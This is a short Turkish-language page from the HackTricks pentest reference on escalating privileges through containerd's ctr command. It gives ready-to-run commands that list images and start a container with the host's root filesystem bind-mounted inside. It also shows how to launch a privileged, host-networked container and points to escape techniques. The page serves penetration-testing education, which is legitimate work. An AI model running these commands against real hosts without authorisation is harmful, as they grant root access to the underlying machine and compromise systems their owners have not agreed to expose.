# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Temel bilgiler

Aşağıdaki bağlantıya gidin ve **`containerd` ve `ctr`'nin konteyner yığını içinde nerede yer aldığını** öğrenin:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

bir hostta `ctr` komutunun bulunduğunu görürseniz:
```bash
which ctr
/usr/bin/ctr
```
Görüntüleri listeleyebilirsiniz:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Ve sonra **ana makinenin kök dizinini içine bağlayarak bu imajlardan birini çalıştırın**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Bir privileged container çalıştırın ve ondan escape yapın.\
Privileged bir container'ı şu şekilde çalıştırabilirsiniz:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Daha sonra aşağıdaki sayfada bahsedilen bazı teknikleri **ayrıcalıklı yetenekleri kötüye kullanarak ondan kaçmak için** kullanabilirsiniz:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
